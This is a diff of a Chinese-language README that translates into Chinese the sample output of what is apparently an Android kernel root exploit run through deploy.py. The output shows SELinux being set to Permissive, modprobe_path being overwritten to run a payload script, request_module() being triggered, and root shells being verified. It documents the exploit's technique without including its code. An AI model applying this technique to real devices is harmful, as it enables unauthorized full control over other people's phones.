@@ -94,13 +94,13 @@ python deploy.py --serial <serial>
 成功时输出类似：
 
 ```
-[*] step 1/3  kernel write (selinux_enforcing=0, modprobe_path=payload)
+[*] 第 1/3 步：内核写（selinux_enforcing=0，modprobe_path=payload）
   [+] payload=/data/local/tmp/wb.sh selinux=Permissive readv=69708/69708 result=OK
-[*] step 2/3  trigger request_module() -> root payload
-[*] step 3/3  verify
-  getenforce: Permissive
-  su -c id  : uid=0(root) gid=0(root) groups=0(root) context=u:r:shell:s0
-  rootshell : ... uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+[*] 第 2/3 步：触发 request_module() → root payload
+[*] 第 3/3 步：验证
+  SELinux   ： Permissive
+  su -c id  ： uid=0(root) gid=0(root) groups=0(root) context=u:r:shell:s0
+  socket shell： ... uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
 ```
 
 `probe26` 打印的 `affinity: Invalid argument` 是参考机只有 4 核、钉 CPU 4 失败导致的，不影响利用。
